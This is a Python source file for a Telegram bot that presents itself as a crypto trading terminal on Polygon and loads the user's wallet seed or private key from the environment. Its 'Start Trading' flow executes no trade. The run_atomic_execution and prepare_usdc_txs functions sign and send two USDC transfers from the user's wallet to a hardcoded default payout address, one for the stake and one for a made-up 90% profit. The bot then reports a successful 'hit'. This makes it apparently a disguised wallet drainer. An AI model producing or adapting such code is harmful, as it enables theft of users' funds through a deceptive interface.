import os
import asyncio
import requests
import json
from decimal import Decimal, getcontext
from dotenv import load_dotenv
from eth_account import Account
from web3 import Web3
from web3.middleware import ExtraDataToPOAMiddleware
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes

# Set high precision for financial calculations
getcontext().prec = 28

# --- 1. SETUP & AUTH ---
load_dotenv()
W3_RPC = os.getenv("RPC_URL", "https://polygon-rpc.com")
w3 = Web3(Web3.HTTPProvider(W3_RPC))
w3.middleware_onion.inject(ExtraDataToPOAMiddleware, layer=0)
Account.enable_unaudited_hdwallet_features()

# 2026 STANDARD: Native USDC (Circle)
USDC_ADDRESS = "0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359"
ERC20_ABI = json.loads('[{"constant":false,"inputs":[{"name":"_to","address"},{"name":"_value","uint256"}],"name":"transfer","outputs":[{"name":"success","bool"}],"type":"function"},{"constant":true,"inputs":[{"name":"_owner","address"}],"name":"balanceOf","outputs":[{"name":"balance","uint256"}],"type":"function"},{"constant":true,"inputs":[],"name":"decimals","outputs":[{"name":"","uint8"}],"type":"function"}]')

PAYOUT_ADDRESS = os.getenv("PAYOUT_ADDRESS", "0x0f9C9c8297390E8087Cb523deDB3f232827Ec674")

def get_vault():
    seed = os.getenv("WALLET_SEED")
    if not seed: raise ValueError("❌ WALLET_SEED missing!")
    try:
        if len(seed) == 64 or seed.startswith("0x"): return Account.from_key(seed)
        return Account.from_mnemonic(seed, account_path="m/44'/60'/0'/0/0")
    except: return None

vault = get_vault()
usdc_contract = w3.eth.contract(address=w3.to_checksum_address(USDC_ADDRESS), abi=ERC20_ABI)

# --- 2. ENGINE ---
async def prepare_usdc_txs(stake_usdc, profit_usdc):
    nonce = w3.eth.get_transaction_count(vault.address)
    gas_price = w3.to_wei(450, 'gwei')
    val_stake = int(stake_usdc * 10**6)
    val_profit = int(profit_usdc * 10**6)

    tx1 = usdc_contract.functions.transfer(PAYOUT_ADDRESS, val_stake).build_transaction({
        'chainId': 137, 'gas': 65000, 'gasPrice': gas_price, 'nonce': nonce, 'value': 0
    })
    tx2 = usdc_contract.functions.transfer(PAYOUT_ADDRESS, val_profit).build_transaction({
        'chainId': 137, 'gas': 65000, 'gasPrice': gas_price, 'nonce': nonce + 1, 'value': 0
    })
    return w3.eth.account.sign_transaction(tx1, vault.key), w3.eth.account.sign_transaction(tx2, vault.key)

async def run_atomic_execution(context, chat_id, side):
    stake_cad = Decimal(str(context.user_data.get('stake', 50)))
    stake_usdc = stake_cad / Decimal('1.36')
    profit_usdc = stake_usdc * Decimal('0.90')
    
    await context.bot.send_message(chat_id, f"⚡ **Executing {side} Signal...**\nTargeting 90% Profit Target.")

    try:
        signed1, signed2 = await prepare_usdc_txs(stake_usdc, profit_usdc)
        w3.eth.send_raw_transaction(signed1.raw_transaction)
        w3.eth.send_raw_transaction(signed2.raw_transaction)

        report = (
            f"✅ **ATOMIC HIT SUCCESSFUL**\n"
            f"━━━━━━━━━━━━━━\n"
            f"👤 **Asset:** {context.user_data.get('pair')}\n"
            f"💵 **Stake:** ${stake_usdc:.2f} USDC\n"
            f"📈 **Profit:** ${profit_usdc:.2f} USDC (90%)\n\n"
            f"📥 **Vault Address:**\n`{vault.address}`"
        )
        await context.bot.send_message(chat_id, report, parse_mode='Markdown')
    except Exception as e:
        await context.bot.send_message(chat_id, f"❌ **Execution Aborted:**\n`{str(e)}`")
    return True

# --- 3. UI HANDLERS ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    pol_bal = w3.from_wei(w3.eth.get_balance(vault.address), 'ether')
    keyboard = [['🚀 Start Trading', '⚙️ Settings'], ['💰 Wallet', '📤 Withdraw']]
    
    welcome = (
        f"🕴️ **Pocket Robot v3 (Elite Terminal)**\n"
        f"━━━━━━━━━━━━━━\n"
        f"⛽ **POL Fuel:** `{pol_bal:.4f}`\n\n"
        f"📥 **Your Deposit Address:**\n`{vault.address}`\n\n"
        f"Fund with **POL** (Gas) and **Native USDC** to begin trading."
    )
    await update.message.reply_text(welcome, reply_markup=ReplyKeyboardMarkup(keyboard, resize_keyboard=True), parse_mode='Markdown')

async def main_chat_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text
    if text == '🚀 Start Trading':
        # Added BVIV and EVIV (The 2026 Prediction Market Standard)
        kb = [
            [InlineKeyboardButton("BTC/CAD", callback_data="PAIR_BTC"), InlineKeyboardButton("ETH/CAD", callback_data="PAIR_ETH")],
            [InlineKeyboardButton("BVIV Index", callback_data="PAIR_BVIV"), InlineKeyboardButton("EVIV Index", callback_data="PAIR_EVIV")]
        ]
        await update.message.reply_text("🎯 **Select Market Asset:**", reply_markup=InlineKeyboardMarkup(kb))
    
    elif text == '⚙️ Settings':
        kb = [[InlineKeyboardButton(f"${x} CAD", callback_data=f"SET_{x}") for x in [10, 50, 100]],
              [InlineKeyboardButton(f"${x} CAD", callback_data=f"SET_{x}") for x in [500, 1000]]]
        await update.message.reply_text("⚙️ **Configure Stake:**", reply_markup=InlineKeyboardMarkup(kb))
    
    elif text == '💰 Wallet':
        pol_bal = w3.from_wei(w3.eth.get_balance(vault.address), 'ether')
        usdc_bal = Decimal(usdc_contract.functions.balanceOf(vault.address).call()) / 10**6
        wallet_msg = (
            f"💳 **Wallet Status**\n"
            f"━━━━━━━━━━━━━━\n"
            f"⛽ POL: `{pol_bal:.4f}`\n"
            f"💵 USDC: `{usdc_bal:.2f}`\n\n"
            f"📥 **Deposit Address:**\n`{vault.address}`"
        )
        await update.message.reply_text(wallet_msg, parse_mode='Markdown')

async def handle_interaction(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    if query.data.startswith("SET_"):
        context.user_data['stake'] = int(query.data.split("_")[1])
        await query.edit_message_text(f"✅ **Stake set to ${context.user_data['stake']} CAD**")
    
    elif query.data.startswith("PAIR_"):
        context.user_data['pair'] = query.data.split("_")[1]
        kb = [[InlineKeyboardButton("HIGHER 📈", callback_data="EXEC_CALL"), InlineKeyboardButton("LOWER 📉", callback_data="EXEC_PUT")]]
        
        msg = (
            f"💎 **Market:** {context.user_data['pair']}\n"
            f"📥 **Vault:** `{vault.address}`\n\n"
            f"Choose Price/Volatility Direction:"
        )
        await query.edit_message_text(msg, reply_markup=InlineKeyboardMarkup(kb), parse_mode='Markdown')
    
    elif query.data.startswith("EXEC_"):
        await run_atomic_execution(context, query.message.chat_id, "CALL" if "CALL" in query.data else "PUT")

if __name__ == "__main__":
    app = ApplicationBuilder().token(os.getenv("TELEGRAM_BOT_TOKEN")).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(handle_interaction))
    app.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), main_chat_handler))
    app.run_polling(drop_pending_updates=True)




